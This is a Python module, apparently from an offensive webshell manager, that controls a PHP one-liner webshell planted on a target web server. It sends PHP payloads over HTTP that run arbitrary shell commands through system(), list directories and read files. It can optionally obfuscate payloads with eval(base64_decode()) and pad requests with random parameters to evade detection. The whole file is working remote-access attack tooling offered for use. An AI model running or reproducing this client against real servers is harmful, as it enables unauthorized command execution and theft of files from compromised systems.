"""PHP Session的实现"""
import base64
import json
import logging
import random
import re
import string
import typing as t
from dataclasses import dataclass

import httpx

from . import exceptions
from ..utils import random_english_words
from .base import Session, DirectoryEntry

logger = logging.getLogger("sessions.php")

SUBMIT_WRAPPER_PHP = """\
echo '{delimiter_start_1}'.'{delimiter_start_2}';\
try{{{payload_raw}}}catch(Exception $e){{die("POSTEXEC_F"."AILED");}}\
echo '{delimiter_stop}';"""

LIST_DIR_PHP = """
error_reporting(0);
$folderPath = DIR_PATH;
$files = scandir($folderPath);
$result = array();
foreach ($files as $file) {
    $filePath = $folderPath . $file;
    $fileType = filetype($filePath);
    if($fileType == "link") {
        if(is_dir($filePath)) {
            $fileType = "link-dir";
        }else if(is_file($filePath)) {
            $fileType = "link-file";
        }else{
            $fileType = "unknown";
        }
    }
    array_push($result, array(
        "name" => basename($file),
        "type" => $fileType,
        "permission" => substr(decoct(fileperms($filePath)), -3)
    ));
}
echo json_encode($result);
"""

GET_FILE_CONTENT_PHP = """
$filePath = FILE_PATH;
if(!is_file($filePath)) {
    echo "WRONG_NOT_FILE";
}
else if(!is_readable($filePath)) {
    echo "WRONG_NO_PERMISSION";
}
else if(filesize($filePath) > MAX_SIZE) {
    echo "WRONG_FILE_TOO_LARGE";
}else {
    $content = file_get_contents($filePath);
    echo base64_encode($content);
}
"""

__all__ = ["PHPWebshell", "PHPWebshellOneliner"]


@dataclass
class PHPWebshellOptions:
    """除了submit_raw之外的函数需要的各类选项"""

    encoder: t.Literal["raw", "base64"] = "raw"
    http_params_obfs: bool = False  # TODO: remove me


def compress_php_code(source: str) -> str:
    """去除php payload中的注释和换行

    Args:
        source (str): 原PHP payload

    Returns:
        str: 去除结果
    """
    source = re.sub("(#|//).+\n", "\n", source)
    return re.sub(r"(?<=[\{\};])\n? +", "", source)


class PHPWebshell(Session):
    """PHP session各类工具函数的实现"""

    def __init__(self, options: t.Union[None, PHPWebshellOptions]):
        self.options = options if options else PHPWebshellOptions()

    def encode(self, payload: str) -> str:
        """应用编码器"""
        if self.options.encoder == "raw":
            return payload
        if self.options.encoder == "base64":
            encoded = base64.b64encode(payload.encode()).decode()
            return f'eval(base64_decode("{encoded}"));'
        raise RuntimeError(f"Unsupported encoder: {self.options.encoder}")

    async def execute_cmd(self, cmd: str) -> str:
        return await self.submit(f"system({cmd!r});")

    async def list_dir(self, dir_path: str) -> t.List[DirectoryEntry]:
        dir_path = dir_path.removesuffix("/") + "/"
        php_code = LIST_DIR_PHP.replace("DIR_PATH", repr(dir_path))
        json_result = await self.submit(php_code)
        try:
            result = json.loads(json_result)
        except json.JSONDecodeError as exc:
            raise exceptions.UnexpectedError("JSON解析失败: " + json_result) from exc
        result = [
            DirectoryEntry(
                name=item["name"],
                permission=item["permission"],
                entry_type=(
                    item["type"]
                    if item["type"] in ["dir", "file", "link-dir", "link-file"]
                    else "unknown"
                ),
            )
            for item in result
        ]
        if not any(entry.name == ".." for entry in result):
            result.insert(
                0, DirectoryEntry(name="..", permission="555", entry_type="dir")
            )
        return result

    async def get_file_contents(
        self, filepath: str, max_size: int = 1024 * 200
    ) -> bytes:
        php_code = GET_FILE_CONTENT_PHP.replace("FILE_PATH", repr(filepath)).replace(
            "MAX_SIZE", str(max_size)
        )
        result = await self.submit(php_code)
        if result == "WRONG_NOT_FILE":
            raise exceptions.FileError("目标不是一个文件")
        if result == "WRONG_NO_PERMISSION":
            raise exceptions.FileError("没有权限读取这个文件")
        if result == "WRONG_FILE_TOO_LARGE":
            raise exceptions.FileError(f"文件大小太大(>{max_size}B)，建议下载编辑")
        return base64.b64decode(result)

    async def get_pwd(self) -> str:
        return await self.submit("echo __DIR__;")

    async def test_usablility(self) -> bool:
        first_string, second_string = (
            "".join(random.choices(string.ascii_lowercase, k=6)),
            "".join(random.choices(string.ascii_lowercase, k=6)),
        )
        try:
            result = await self.submit(f"echo '{first_string}' . '{second_string}';")
        except exceptions.NetworkError:
            return False
        return (first_string + second_string) in result

    async def submit(self, payload: str) -> str:
        """将php payload通过encoder编码后提交"""
        start, stop = (
            "".join(random.choices(string.ascii_lowercase, k=6)),
            "".join(random.choices(string.ascii_lowercase, k=6)),
        )
        payload = SUBMIT_WRAPPER_PHP.format(
            delimiter_start_1=start[:3],
            delimiter_start_2=start[3:],
            delimiter_stop=stop,
            payload_raw=payload,
        )
        payload = compress_php_code(payload)
        payload = self.encode(payload)
        status_code, text = await self.submit_raw(payload)
        if status_code != 200:
            raise exceptions.UnexpectedError(f"status code error: {status_code}")
        if "POSTEXEC_FAILED" in text:
            raise exceptions.UnexpectedError(
                "POSTEXEC_FAILED found, payload run failed"
            )
        idx_start = text.find(start)
        if idx_start == -1:
            raise exceptions.UnexpectedError(
                f"idx error: start={idx_start}, text={repr(text)}"
            )
        idx_stop_r = text[idx_start:].find(stop)
        if idx_stop_r == -1:
            raise exceptions.UnexpectedError(
                f"idx error: start={idx_start}, stop_r={idx_stop_r}, text={text!r}"
            )
        idx_stop = idx_stop_r + idx_start
        return text[idx_start + len(start) : idx_stop]

    async def submit_raw(self, payload: str) -> t.Tuple[int, str]:
        """提交原始php payload

        Args:
            payload (str): 需要提交的payload

        Returns:
            t.Union[t.Tuple[int, str], None]: 返回的结果，要么为状态码和响应正文，要么为None
        """
        raise NotImplementedError("这个函数应该由实际的实现override")


class PHPWebshellOneliner(PHPWebshell):
    """一句话的php webshell"""

    def __init__(
        self,
        method: str,
        url: str,
        password: str,
        params: t.Union[t.Dict, None] = None,
        data: t.Union[t.Dict, None] = None,
        http_params_obfs: bool = False,
        options: t.Union[PHPWebshellOptions, None] = None,
    ) -> None:
        super().__init__(options)
        self.method = method.upper()
        self.url = url
        self.password = password
        self.params = {} if params is None else params
        self.data = {} if data is None else data
        self.http_params_obfs = http_params_obfs

    async def submit_raw(self, payload: str) -> t.Tuple[int, str]:
        params = self.params.copy()
        data = self.data.copy()
        obfs_data = {}
        if self.http_params_obfs:
            obfs_data = {
                random_english_words(): random_english_words() for _ in range(20)
            }
        if self.method in ["GET", "HEAD"]:
            params[self.password] = payload
            params.update(obfs_data)
        else:
            data[self.password] = payload
            data.update(obfs_data)
        try:
            async with httpx.AsyncClient() as client:
                response = await client.request(
                    method=self.method, url=self.url, params=params, data=data
                )
                return response.status_code, response.text

        except httpx.HTTPError as exc:
            raise exceptions.NetworkError("发送HTTP请求失败") from exc
